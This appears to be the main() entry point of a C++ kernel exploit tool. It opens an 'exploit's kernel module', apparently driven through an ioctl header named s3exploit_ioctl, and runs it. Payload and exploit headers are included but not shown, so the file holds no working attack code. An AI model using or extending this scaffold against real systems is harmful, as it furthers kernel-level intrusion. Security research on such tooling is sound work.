#include "log.hpp"
#include "exploit_module.hpp"
#include "file.hpp"
#include "s3exploit_ioctl.h"
#include <errno.h>
#include <cstring>
#include "payload.hpp"
#include <numeric>


int main(int argc, char* argv[]) {
    auto exploit_opt = ExploitModule::open();
    if (!exploit_opt) {
        log_error("Cannot open exploit's kernel module. exiting\n");
        return -1;
    }
    ExploitModule exploit = (ExploitModule) exploit_opt;

    return exploit.run();    
}
